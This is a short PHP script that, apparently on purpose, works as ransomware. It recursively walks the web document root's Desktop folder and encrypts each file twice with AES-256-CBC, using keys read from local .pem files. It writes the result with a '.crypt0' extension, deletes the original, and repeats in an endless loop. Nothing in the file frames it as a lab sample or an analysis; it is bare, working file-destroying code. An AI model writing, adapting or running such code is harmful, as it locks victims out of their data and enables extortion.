<?php
ini_set('memory_limit', '-1');
set_time_limit(0);
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) { //Credits to some website which isn't up right now
    $output = false;

    $encrypt_method = "AES-256-CBC";

    $key = hash('sha256', $secret_key);
    
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if( $action == 'encrypt' ) {
        return base64_encode(openssl_encrypt($string, $encrypt_method, $key, 0, $iv));
    }
    else if( $action == 'decrypt' ){
        return openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
}

function encfile($filename){
	if (strpos($filename, ".crypt0") !== false || strpos($filename, '.pem') !== false) {
    return;
	}
	file_put_contents($filename.".crypt0", (encrypt_decrypt('encrypt', (encrypt_decrypt('encrypt', file_get_contents($filename), file_get_contents(".key1.pem"), file_get_contents(".iv.pem"))), file_get_contents(".key2.pem"), file_get_contents(".iv.pem"))));
	unlink($filename);
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
		}
	}

}

while(true) {
	encdir($_SERVER['DOCUMENT_ROOT'] . "/Desktop");
}
?>
